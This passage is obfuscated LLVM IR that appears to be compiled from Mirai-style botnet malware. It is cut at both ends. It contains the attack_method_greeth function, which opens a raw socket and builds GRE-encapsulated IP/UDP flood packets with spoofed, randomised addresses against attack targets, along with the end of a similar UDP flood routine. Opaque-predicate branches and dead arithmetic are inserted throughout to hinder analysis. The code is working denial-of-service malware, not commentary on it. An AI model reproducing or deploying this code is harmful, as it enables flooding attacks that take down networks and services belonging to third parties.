  store %struct.udphdr* %788, %struct.udphdr** %38, align 8
  %789 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %790 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %789, i64 1
  %791 = bitcast %struct.udphdr* %790 to i8*
  store i8* %791, i8** %39, align 8
  %792 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %793 = load i32, i32* %17, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %792, i64 %794
  %796 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %795, i32 0, i32 2
  %797 = load i8, i8* %796, align 4
  %798 = zext i8 %797 to i32
  %799 = icmp slt i32 %798, 32
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %388
  %800 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %801 = load i32, i32* %17, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %800, i64 %802
  %804 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %803, i32 0, i32 1
  %805 = load i32, i32* %804, align 4
  %806 = call i32 @ntohl(i32 %805) #7
  %807 = call i32 @rand_next()
  %808 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %809 = load i32, i32* %17, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %808, i64 %810
  %812 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %811, i32 0, i32 2
  %813 = load i8, i8* %812, align 4
  %814 = zext i8 %813 to i32
  %_77 = sub i32 0, %807
  %gen78 = add i32 %_77, %814
  %_79 = sub i32 0, %807
  %gen80 = add i32 %_79, %814
  %815 = lshr i32 %807, %814
  %_81 = sub i32 0, %806
  %gen82 = add i32 %_81, %815
  %_83 = sub i32 0, %806
  %gen84 = add i32 %_83, %815
  %_85 = sub i32 0, %806
  %gen86 = add i32 %_85, %815
  %_87 = sub i32 %806, %815
  %gen88 = mul i32 %_87, %815
  %816 = add i32 %806, %815
  %817 = call i32 @htonl(i32 %816) #7
  %818 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %819 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %818, i32 0, i32 9
  store i32 %817, i32* %819, align 4
  br label %originalBB76

originalBB92alteredBB:                            ; preds = %originalBB92, %436
  %820 = call i32 @rand_next()
  %_93 = sub i32 %820, 65535
  %gen94 = mul i32 %_93, 65535
  %821 = and i32 %820, 65535
  %822 = trunc i32 %821 to i16
  %823 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %824 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %823, i32 0, i32 3
  store i16 %822, i16* %824, align 4
  %825 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %826 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %825, i32 0, i32 3
  %827 = load i16, i16* %826, align 4
  %828 = zext i16 %827 to i32
  %_95 = sub i32 %828, 1000
  %gen96 = mul i32 %_95, 1000
  %829 = sub nsw i32 %828, 1000
  %_97 = shl i32 %829, -1
  %830 = xor i32 %829, -1
  %831 = trunc i32 %830 to i16
  %832 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %833 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %832, i32 0, i32 3
  store i16 %831, i16* %833, align 4
  br label %originalBB92

originalBB101alteredBB:                           ; preds = %originalBB101, %494
  %834 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %835 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %834, i32 0, i32 9
  %836 = load i32, i32* %835, align 4
  %837 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %838 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %837, i32 0, i32 9
  store i32 %836, i32* %838, align 4
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %519
  %839 = load i8*, i8** %39, align 8
  %840 = load i32, i32* %26, align 4
  call void @rand_str(i8* %839, i32 %840)
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %605
  %841 = load i32, i32* %17, align 4
  %_110 = sub i32 %841, 1
  %gen111 = mul i32 %_110, 1
  %_112 = sub i32 %841, 1
  %gen113 = mul i32 %_112, 1
  %_114 = sub i32 %841, 1
  %gen115 = mul i32 %_114, 1
  %_116 = shl i32 %841, 1
  %_117 = sub i32 %841, 1
  %gen118 = mul i32 %_117, 1
  %_119 = shl i32 %841, 1
  %_120 = sub i32 %841, 1
  %gen121 = mul i32 %_120, 1
  %_122 = sub i32 %841, 1
  %gen123 = mul i32 %_122, 1
  %_124 = shl i32 %841, 1
  %842 = add nsw i32 %841, 1
  store i32 %842, i32* %17, align 4
  br label %originalBB109
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %103

; <label>:86:                                     ; preds = %4
  %87 = load i32, i32* @x.21
  %88 = load i32, i32* @y.22
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i32, i32* @x.21
  %96 = load i32, i32* @y.22
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %616

; <label>:103:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %104 = load i32, i32* %10, align 4
  %105 = bitcast i32* %9 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %111

; <label>:108:                                    ; preds = %103
  %109 = load i32, i32* %10, align 4
  %110 = call i32 @close(i32 %109)
  br label %616

; <label>:111:                                    ; preds = %103
  store i32 0, i32* %9, align 4
  br label %112

; <label>:112:                                    ; preds = %originalBBpart211, %111
  %113 = load i32, i32* %9, align 4
  %114 = load i8, i8* %5, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp slt i32 %113, %115
  br i1 %116, label %117, label %303

; <label>:117:                                    ; preds = %112
  %118 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  store i8* %118, i8** %122, align 8
  %123 = load i8**, i8*** %11, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = bitcast i8* %127 to %struct.iphdr*
  store %struct.iphdr* %128, %struct.iphdr** %22, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i64 1
  %131 = bitcast %struct.iphdr* %130 to %struct.grehdr*
  store %struct.grehdr* %131, %struct.grehdr** %23, align 8
  %132 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %133 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %132, i64 1
  %134 = bitcast %struct.grehdr* %133 to %struct.ethhdr*
  store %struct.ethhdr* %134, %struct.ethhdr** %24, align 8
  %135 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %136 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %135, i64 1
  %137 = bitcast %struct.ethhdr* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %25, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.udphdr*
  store %struct.udphdr* %140, %struct.udphdr** %26, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, 15
  %145 = or i8 %144, 64
  store i8 %145, i8* %142, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, -16
  %150 = or i8 %149, 5
  store i8 %150, i8* %147, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 66, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

; <label>:170:                                    ; preds = %117
  %171 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %170, %117
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 47, i8* %176, align 1
  %177 = load i32, i32* %21, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %189 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %190 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  %191 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %192 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %193 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %192, i32 0, i32 2
  store i16 %191, i16* %193, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %195 = bitcast %struct.iphdr* %194 to i8*
  %196 = load i8, i8* %195, align 4
  %197 = and i8 %196, 15
  %198 = or i8 %197, 64
  store i8 %198, i8* %195, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %200 = bitcast %struct.iphdr* %199 to i8*
  %201 = load i8, i8* %200, align 4
  %202 = and i8 %201, -16
  %203 = or i8 %202, 5
  store i8 %203, i8* %200, align 4
  %204 = load i8, i8* %12, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 1
  store i8 %204, i8* %206, align 1
  %207 = load i32, i32* %18, align 4
  %208 = sext i32 %207 to i64
  %209 = add i64 28, %208
  %210 = trunc i64 %209 to i16
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 2
  store i16 %211, i16* %213, align 2
  %214 = load i16, i16* %13, align 2
  %215 = zext i16 %214 to i32
  %216 = xor i32 %215, -1
  %217 = trunc i32 %216 to i16
  %218 = call zeroext i16 @htons(i16 zeroext %217) #7
  %219 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 3
  store i16 %218, i16* %220, align 4
  %221 = load i8, i8* %14, align 1
  %222 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 5
  store i8 %221, i8* %223, align 4
  %224 = load i8, i8* %15, align 1
  %225 = icmp ne i8 %224, 0
  br i1 %225, label %226, label %230

; <label>:226:                                    ; preds = %174
  %227 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %228 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 4
  store i16 %227, i16* %229, align 2
  br label %230

; <label>:230:                                    ; preds = %226, %174
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 6
  store i8 17, i8* %232, align 1
  %233 = call i32 @rand_next()
  %234 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 8
  store i32 %233, i32* %235, align 4
  %236 = load i8, i8* %20, align 1
  %237 = icmp ne i8 %236, 0
  br i1 %237, label %238, label %260

; <label>:238:                                    ; preds = %230
  %239 = load i32, i32* @x.21
  %240 = load i32, i32* @y.22
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %238
  %247 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  %249 = load i32, i32* %248, align 4
  %250 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 9
  store i32 %249, i32* %251, align 4
  %252 = load i32, i32* @x.21
  %253 = load i32, i32* @y.22
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %268

; <label>:260:                                    ; preds = %230
  %261 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 8
  %263 = load i32, i32* %262, align 4
  %264 = sub i32 %263, 1024
  %265 = xor i32 %264, -1
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 9
  store i32 %265, i32* %267, align 4
  br label %268

; <label>:268:                                    ; preds = %260, %originalBBpart24
  %269 = load i16, i16* %16, align 2
  %270 = call zeroext i16 @htons(i16 zeroext %269) #7
  %271 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %272 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %271, i32 0, i32 0
  store i16 %270, i16* %272, align 2
  %273 = load i16, i16* %17, align 2
  %274 = call zeroext i16 @htons(i16 zeroext %273) #7
  %275 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 1
  store i16 %274, i16* %276, align 2
  %277 = load i32, i32* %18, align 4
  %278 = sext i32 %277 to i64
  %279 = add i64 8, %278
  %280 = trunc i64 %279 to i16
  %281 = call zeroext i16 @htons(i16 zeroext %280) #7
  %282 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i32 0, i32 2
  store i16 %281, i16* %283, align 2
  br label %284

; <label>:284:                                    ; preds = %268
  %285 = load i32, i32* @x.21
  %286 = load i32, i32* @y.22
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %284
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  %295 = load i32, i32* @x.21
  %296 = load i32, i32* @y.22
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %112

; <label>:303:                                    ; preds = %112
  br label %304

; <label>:304:                                    ; preds = %originalBBpart235, %303
  %305 = load i32, i32* @x.21
  %306 = load i32, i32* @y.22
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %304
  store i32 0, i32* %9, align 4
  %313 = load i32, i32* @x.21
  %314 = load i32, i32* @y.22
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %321

; <label>:321:                                    ; preds = %596, %originalBBpart215
  %322 = load i32, i32* %9, align 4
  %323 = load i8, i8* %5, align 1
  %324 = zext i8 %323 to i32
  %325 = icmp slt i32 %322, %324
  br i1 %325, label %326, label %599

; <label>:326:                                    ; preds = %321
  %327 = load i8**, i8*** %11, align 8
  %328 = load i32, i32* %9, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds i8*, i8** %327, i64 %329
  %331 = load i8*, i8** %330, align 8
  store i8* %331, i8** %30, align 8
  %332 = load i8*, i8** %30, align 8
  %333 = bitcast i8* %332 to %struct.iphdr*
  store %struct.iphdr* %333, %struct.iphdr** %31, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i64 1
  %336 = bitcast %struct.iphdr* %335 to %struct.grehdr*
  store %struct.grehdr* %336, %struct.grehdr** %32, align 8
  %337 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %338 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %337, i64 1
  %339 = bitcast %struct.grehdr* %338 to %struct.ethhdr*
  store %struct.ethhdr* %339, %struct.ethhdr** %33, align 8
  %340 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %341 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %340, i64 1
  %342 = bitcast %struct.ethhdr* %341 to %struct.iphdr*
  store %struct.iphdr* %342, %struct.iphdr** %34, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i64 1
  %345 = bitcast %struct.iphdr* %344 to %struct.udphdr*
  store %struct.udphdr* %345, %struct.udphdr** %35, align 8
  %346 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i64 1
  %348 = bitcast %struct.udphdr* %347 to i8*
  store i8* %348, i8** %36, align 8
  %349 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 2
  %354 = load i8, i8* %353, align 4
  %355 = zext i8 %354 to i32
  %356 = icmp slt i32 %355, 32
  br i1 %356, label %357, label %378

; <label>:357:                                    ; preds = %326
  %358 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %359 = load i32, i32* %9, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i64 %360
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i32 0, i32 1
  %363 = load i32, i32* %362, align 4
  %364 = call i32 @ntohl(i32 %363) #7
  %365 = call i32 @rand_next()
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 2
  %371 = load i8, i8* %370, align 4
  %372 = zext i8 %371 to i32
  %373 = lshr i32 %365, %372
  %374 = add i32 %364, %373
  %375 = call i32 @htonl(i32 %374) #7
  %376 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 9
  store i32 %375, i32* %377, align 4
  br label %378

; <label>:378:                                    ; preds = %357, %326
  %379 = load i32, i32* %21, align 4
  %380 = icmp eq i32 %379, -1
  br i1 %380, label %381, label %401

; <label>:381:                                    ; preds = %378
  %382 = load i32, i32* @x.21
  %383 = load i32, i32* @y.22
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %381
  %390 = call i32 @rand_next()
  %391 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 8
  store i32 %390, i32* %392, align 4
  %393 = load i32, i32* @x.21
  %394 = load i32, i32* @y.22
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %401

; <label>:401:                                    ; preds = %originalBBpart219, %378
  %402 = load i32, i32* @x.21
  %403 = load i32, i32* @y.22
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %401
  %410 = load i16, i16* %13, align 2
  %411 = zext i16 %410 to i32
  %412 = icmp eq i32 %411, 65535
  %413 = load i32, i32* @x.21
  %414 = load i32, i32* @y.22
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %412, label %421, label %436

; <label>:421:                                    ; preds = %originalBBpart223
  %422 = call i32 @rand_next()
